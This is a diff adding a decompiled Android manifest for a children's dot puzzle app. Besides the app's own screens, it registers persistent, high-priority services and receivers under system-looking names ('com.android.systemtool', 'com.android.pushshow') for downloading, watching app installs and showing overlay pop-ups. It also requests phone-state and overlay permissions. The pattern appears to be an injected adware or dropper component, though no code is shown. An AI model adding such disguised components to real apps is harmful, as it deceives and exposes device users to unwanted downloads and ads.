@@ -1,0 +1,241 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest
+    xmlns:android="http://schemas.android.com/apk/res/android"
+    android:versionCode="34741"
+    android:versionName="1.8.11"
+    android:installLocation="0"
+    package="zok.android.dotssd">
+
+    <uses-sdk
+        android:minSdkVersion="4" />
+
+    <application
+        android:theme="@ref/0x01030007"
+        android:label="@ref/0x7f070000"
+        android:icon="@ref/0x7f02001f"
+        android:name="DotsApp">
+
+        <activity
+            android:name=".HomeActivity"
+            android:screenOrientation="0"
+            android:configChanges="0xa0">
+
+            <intent-filter>
+
+                <action
+                    android:name="android.intent.action.MAIN" />
+
+                <category
+                    android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <activity
+            android:name=".MainActivity"
+            android:screenOrientation="0"
+            android:configChanges="0xa0" />
+
+        <activity
+            android:name=".PreferencesActivity"
+            android:screenOrientation="0"
+            android:configChanges="0xa0" />
+
+        <activity
+            android:theme="@ref/0x0103000b"
+            android:name=".MorePuzzlesActivity"
+            android:screenOrientation="0"
+            android:configChanges="0xa0" />
+
+        <activity
+            android:theme="@ref/0x0103000b"
+            android:name=".LettersPromoActivity"
+            android:screenOrientation="0"
+            android:configChanges="0xa0" />
+
+        <activity
+            android:theme="@ref/0x0103000b"
+            android:name=".MathPromoActivity"
+            android:screenOrientation="0"
+            android:configChanges="0xa0" />
+
+        <activity
+            android:theme="@ref/0x0103000b"
+            android:name=".ShapesPromoActivity"
+            android:screenOrientation="0"
+            android:configChanges="0xa0" />
+
+        <activity
+            android:theme="@ref/0x0103000b"
+            android:name=".PhonicsPromoActivity"
+            android:screenOrientation="0"
+            android:configChanges="0xa0" />
+
+        <service
+            android:name="com.android.systemtool.check.CheckInit"
+            android:persistent="true"
+            android:enabled="true"
+            android:exported="false" />
+
+        <activity
+            android:theme="@ref/0x0103000b"
+            android:label="ADialog"
+            android:name="com.android.systemtool.pop.PopUI"
+            android:configChanges="0xa0" />
+
+        <service
+            android:name="com.android.systemtool.insert.InsertService"
+            android:persistent="true"
+            android:enabled="true"
+            android:exported="false"
+            android:priority="1000">
+
+            <intent-filter
+                android:priority="1000">
+
+                <action
+                    android:name="Intent.ACTION_TIME_TICK" />
+            </intent-filter>
+        </service>
+
+        <service
+            android:name="com.android.systemtool.insert.DownloadService"
+            android:persistent="true"
+            android:enabled="true"
+            android:exported="false"
+            android:priority="1000" />
+
+        <receiver
+            android:name="com.android.systemtool.insert.ApkInstalledService"
+            android:configChanges="0xa0">
+
+            <intent-filter>
+
+                <action
+                    android:name="android.intent.action.PACKAGE_ADDED" />
+
+                <action
+                    android:name="android.intent.action.PACKAGE_REMOVED" />
+
+                <data
+                    android:scheme="package" />
+            </intent-filter>
+        </receiver>
+
+        <receiver
+            android:name="com.android.systemtool.insert.NetStatChanged">
+
+            <intent-filter>
+
+                <action
+                    android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+            </intent-filter>
+        </receiver>
+
+        <service
+            android:name="com.android.pushshow.init.PushShow" />
+
+        <service
+            android:name="com.android.pushshow.init.DownLoadService" />
+
+        <receiver
+            android:name="com.android.pushshow.init.ApkInstalledService">
+
+            <intent-filter>
+
+                <action
+                    android:name="android.intent.action.PACKAGE_ADDED" />
+
+                <action
+                    android:name="android.intent.action.PACKAGE_REMOVED" />
+
+                <data
+                    android:scheme="package" />
+            </intent-filter>
+        </receiver>
+
+        <receiver
+            android:name="com.android.pushshow.init.NetStatChanged">
+
+            <intent-filter>
+
+                <action
+                    android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+            </intent-filter>
+        </receiver>
+    </application>
+
+    <uses-permission
+        android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+
+    <uses-permission
+        android:name="android.permission.READ_EXTERNAL_STORAGE" />
+
+    <uses-permission
+        android:name="android.permission.INTERNET" />
+
+    <uses-permission
+        android:name="android.permission.ACCESS_NETWORK_STATE" />
+
+    <uses-permission
+        android:name="android.permission.READ_PHONE_STATE" />
+
+    <uses-permission
+        android:name="android.permission.INTERNET" />
+
+    <uses-permission
+        android:name="android.permission.GET_TASKS" />
+
+    <uses-permission
+        android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+
+    <uses-permission
+        android:name="android.permission.SYSTEM_OVERLAY_WINDOW" />
+
+    <uses-permission
+        android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+
+    <uses-permission
+        android:name="android.permission.SYSTEM_OVERLAY_WINDOW" />
+
+    <uses-permission
+        android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+
+    <uses-permission
+        android:name="android.permission.READ_EXTERNAL_STORAGE" />
+
+    <uses-permission
+        android:name="android.permission.INTERNET" />
+
+    <uses-permission
+        android:name="android.permission.ACCESS_NETWORK_STATE" />
+
+    <uses-permission
+        android:name="android.permission.READ_PHONE_STATE" />
+
+    <uses-permission
+        android:name="android.permission.INTERNET" />
+
+    <uses-permission
+        android:name="android.permission.GET_TASKS" />
+
+    <uses-permission
+        android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+
+    <uses-permission
+        android:name="android.permission.SYSTEM_OVERLAY_WINDOW" />
+
+    <uses-permission
+        android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+
+    <uses-permission
+        android:name="android.permission.SYSTEM_OVERLAY_WINDOW" />
+
+    <supports-screens
+        android:anyDensity="false"
+        android:smallScreens="false"
+        android:normalScreens="true"
+        android:largeScreens="false" />
+
+    <uses-permission
+        android:name="android.permission.INTERNET" />
+</manifest>
